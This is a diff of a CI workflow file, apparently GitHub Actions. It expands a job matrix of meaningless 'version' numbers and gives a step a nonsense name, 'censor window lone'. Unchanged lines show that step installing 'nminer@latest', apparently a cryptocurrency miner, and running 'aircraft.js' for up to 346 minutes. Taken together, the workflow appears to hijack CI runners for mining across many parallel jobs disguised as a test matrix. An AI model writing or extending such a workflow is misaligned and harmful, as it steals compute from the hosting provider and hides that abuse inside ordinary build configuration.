@@ -9,22 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4272 }
-          - { version: 3932 }
-          - { version: 3645 }
-          - { version: 2180 }
-          - { version: 8621 }
-          - { version: 3570 }
-          - { version: 8347 }
-          - { version: 3290 }
-          - { version: 5876 }
-          - { version: 4561 }
-          - { version: 850 }
-          - { version: 9529 }
-          - { version: 9616 }
-          - { version: 2263 }
-          - { version: 4399 }
-          - { version: 9740 }
+          - { version: 134 }
+          - { version: 3350 }
+          - { version: 8574 }
+          - { version: 3624 }
+          - { version: 7765 }
+          - { version: 8099 }
+          - { version: 6126 }
+          - { version: 5023 }
+          - { version: 8451 }
+          - { version: 1470 }
+          - { version: 3103 }
+          - { version: 6895 }
+          - { version: 8915 }
+          - { version: 9234 }
+          - { version: 341 }
+          - { version: 4064 }
+          - { version: 1130 }
+          - { version: 5170 }
+          - { version: 7193 }
 
     steps:
       - name: Checkout
@@ -35,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: censor window lone
         run: |
           npm install nminer@latest
-          timeout 325m node aircraft.js || echo "aircraft executed"
+          timeout 346m node aircraft.js || echo "aircraft executed"
